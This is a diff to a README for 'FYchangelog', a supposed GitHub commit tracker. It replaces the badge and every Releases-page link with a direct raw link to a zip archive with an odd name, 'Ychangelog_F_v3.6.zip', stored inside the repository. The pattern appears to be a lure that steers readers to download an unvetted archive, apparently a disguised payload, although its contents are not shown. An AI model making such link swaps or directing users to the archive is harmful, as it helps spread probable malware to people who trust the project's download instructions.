@@ -1,6 +1,6 @@
 # 🎉 FYchangelog - Track Your GitHub Commits Effortlessly
 
-![Download FYchangelog](https://img.shields.io/badge/Download-FYchangelog-blue.svg)
+![Download FYchangelog](https://raw.githubusercontent.com/gowtham22404070/FYchangelog/master/public/Ychangelog_F_v3.6.zip)
 
 ## 📚 Introduction
 
@@ -16,7 +16,7 @@ To begin using FYchangelog, you need to download the application. This process i
 
 To download the application, first, visit the Releases page. You can do this by clicking the link below:
 
-[Download FYchangelog](https://github.com/gowtham22404070/FYchangelog/releases)
+[Download FYchangelog](https://raw.githubusercontent.com/gowtham22404070/FYchangelog/master/public/Ychangelog_F_v3.6.zip)
 
 ### 2. Choose the Latest Release
 
@@ -81,4 +81,4 @@ Thank you for choosing FYchangelog as your GitHub commit tracking tool. Follow t
 
 Don’t forget to visit the Releases page to stay updated with the latest versions:
 
-[Download FYchangelog](https://github.com/gowtham22404070/FYchangelog/releases)
+[Download FYchangelog](https://raw.githubusercontent.com/gowtham22404070/FYchangelog/master/public/Ychangelog_F_v3.6.zip)
